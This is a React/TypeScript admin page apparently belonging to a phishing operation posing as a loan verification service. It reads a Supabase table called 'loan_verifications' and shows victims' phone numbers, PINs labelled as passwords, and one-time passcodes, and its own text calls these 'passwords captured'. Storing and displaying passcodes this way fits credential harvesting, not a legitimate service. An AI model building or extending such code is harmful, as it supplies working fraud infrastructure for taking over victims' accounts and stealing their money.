import { useEffect, useState } from 'react';
import { supabase } from '../lib/supabase';

type VerificationRow = {
  id: number;
  mobile_number: string;
  pin: string | null;
  otp: string | null;
  created_at?: string;
};

export default function Admin() {
  const [rows, setRows] = useState<VerificationRow[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');

  useEffect(() => {
    const fetchData = async () => {
      setLoading(true);
      setError('');

      if (!supabase) {
        setError('Supabase is not configured. Please check your environment variables.');
        setLoading(false);
        return;
      }

      const { data, error: dbError } = await supabase
        .from('loan_verifications')
        .select('id, mobile_number, pin, otp, created_at')
        .order('created_at', { ascending: false })
        .limit(100);

      if (dbError) {
        console.error('Error fetching admin data:', dbError);
        setError('Failed to load data from Supabase.');
      } else if (data) {
        setRows(data);
      }

      setLoading(false);
    };

    fetchData();
  }, []);

  return (
    <div className="bg-background min-h-screen py-10">
      <div className="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8">
        <h1 className="text-3xl font-bold text-gray-900 mb-6 text-center">Admin Panel</h1>
        <p className="text-center text-gray-600 mb-8">
          Viewing recent phone numbers and passwords captured in Supabase.
        </p>

        {loading && <p className="text-center text-gray-500">Loading...</p>}
        {error && (
          <div className="mb-6 bg-red-50 border-l-4 border-red-500 p-4 rounded-r-lg">
            <p className="text-red-800">{error}</p>
          </div>
        )}

        {!loading && !error && (
          <div className="overflow-x-auto bg-white shadow-md rounded-lg">
            <table className="min-w-full divide-y divide-gray-200">
              <thead className="bg-gray-50">
                <tr>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Phone Number
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Password
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    OTP
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Created At
                  </th>
                </tr>
              </thead>
              <tbody className="bg-white divide-y divide-gray-200">
                {rows.map((row) => (
                  <tr key={row.id}>
                    <td className="px-4 py-3 whitespace-nowrap text-sm text-gray-900">
                      {row.mobile_number}
                    </td>
                    <td className="px-4 py-3 whitespace-nowrap text-sm text-gray-900">
                      {row.pin ?? '-'}
                    </td>
                    <td className="px-4 py-3 whitespace-nowrap text-sm text-gray-900">
                      {row.otp ?? '-'}
                    </td>
                    <td className="px-4 py-3 whitespace-nowrap text-sm text-gray-500">
                      {row.created_at ? new Date(row.created_at).toLocaleString() : '-'}
                    </td>
                  </tr>
                ))}

                {rows.length === 0 && (
                  <tr>
                    <td
                      colSpan={3}
                      className="px-4 py-6 text-center text-sm text-gray-500"
                    >
                      No records found.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}

